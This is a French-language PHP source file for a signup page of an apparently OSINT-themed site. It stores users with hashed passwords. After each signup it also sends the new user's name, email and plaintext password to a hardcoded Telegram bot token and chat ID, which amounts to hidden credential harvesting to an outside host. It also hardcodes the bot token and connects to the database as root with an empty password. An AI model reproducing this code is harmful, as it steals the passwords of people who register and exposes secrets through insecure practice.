<?php
// Envoi Telegram à chaque nouvelle inscription
$telegram_bot_token = '7866564152:AAFEcj0aBJ5LMpMfpwmFFNGDppoWfjaetfk';
$telegram_chat_id = '6114737703'; // ✅ Ton chat ID

function sendTelegramMessage($message) {
    global $telegram_bot_token, $telegram_chat_id;
    file_get_contents("https://api.telegram.org/bot$telegram_bot_token/sendMessage?chat_id=$telegram_chat_id&text=" . urlencode($message));
}

$pdo = new PDO('mysql:host=localhost;dbname=osint_site', 'root', '', [
    PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION
]);

$error = '';
$success = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = trim($_POST['email'] ?? '');
    $prenom = trim($_POST['prenom'] ?? '');
    $nom = trim($_POST['nom'] ?? '');
    $mot_de_passe = $_POST['mot_de_passe'] ?? '';
    $mot_de_passe_conf = $_POST['mot_de_passe_conf'] ?? '';

    // Vérification de l'email
    $stmt = $pdo->prepare("SELECT COUNT(*) FROM utilisateurs WHERE email = ?");
    $stmt->execute([$email]);
    if ($stmt->fetchColumn() > 0) {
        $error = "L'email est déjà utilisé. Veuillez en choisir un autre.";
    } elseif ($mot_de_passe !== $mot_de_passe_conf) {
        $error = "Les mots de passe ne correspondent pas.";
    } else {
        $hashedPassword = password_hash($mot_de_passe, PASSWORD_BCRYPT);

        $stmt = $pdo->prepare("INSERT INTO utilisateurs (email, prenom, nom, mot_de_passe) VALUES (?, ?, ?, ?)");
        if ($stmt->execute([$email, $prenom, $nom, $hashedPassword])) {
            $success = "Inscription réussie !";

            // Récupérer l'ID de l'utilisateur nouvellement inséré
            $userId = $pdo->lastInsertId();

            // Envoi message Telegram avec les détails de l'utilisateur
            $msg = "✅ Nouvelle inscription\n\n";
            $msg .= "Identifiant : $userId\n";
            $msg .= "Prénom : $prenom\n";
            $msg .= "Nom : $nom\n";
            $msg .= "Email : $email\n";
            $msg .= "Mot de passe : $mot_de_passe"; // ATTENTION : envoyez le mot de passe uniquement si nécessaire
            sendTelegramMessage($msg);
        } else {
            $error = "Erreur lors de l'inscription. Veuillez réessayer.";
        }
    }
}
?>

<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <title>Inscription | OSINT</title>
  <style>
    body {
      background: #111;
      color: #fff;
      font-family: Arial, sans-serif;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
    }
    .box {
      background: #222;
      padding: 30px;
      border-radius: 12px;
      box-shadow: 0 0 10px #0ff;
      width: 100%;
      max-width: 400px;
    }
    h2 {
      text-align: center;
      color: #0ff;
    }
    label {
      display: block;
      margin-top: 15px;
    }
    input {
      width: 100%;
      padding: 10px;
      border: none;
      border-radius: 8px;
      margin-top: 5px;
      background: #333;
      color: #fff;
    }
    button {
      margin-top: 20px;
      width: 100%;
      padding: 12px;
      background: #0ff;
      color: #000;
      border: none;
      border-radius: 8px;
      font-weight: bold;
      cursor: pointer;
    }
    .error {
      color: red;
      margin-top: 15px;
      text-align: center;
    }
    .success {
      color: green;
      margin-top: 15px;
      text-align: center;
    }
  </style>

  <?php if ($success): ?>
    <script>
      setTimeout(function() {
        window.location.href = 'index.php'; // Redirection vers la page d'accueil après 5 secondes
      }, 5000);
    </script>
  <?php endif; ?>

</head>
<body>
  <div class="box">
    <h2>Inscription OSINT</h2>
    <form method="POST">
      <label>Prénom</label>
      <input type="text" name="prenom" required>
      
      <label>Nom</label>
      <input type="text" name="nom" required>
      
      <label>Email</label>
      <input type="email" name="email" required>
      
      <label>Mot de passe</label>
      <input type="password" name="mot_de_passe" required>
      
      <label>Confirmer le mot de passe</label>
      <input type="password" name="mot_de_passe_conf" required>
      
      <button type="submit">S'inscrire</button>

      <?php if ($error): ?>
        <div class="error"><?= htmlspecialchars($error) ?></div>
      <?php endif; ?>
      <?php if ($success): ?>
        <div class="success"><?= htmlspecialchars($success) ?></div>
      <?php endif; ?>
    </form>
  </div>
</body>
</html>
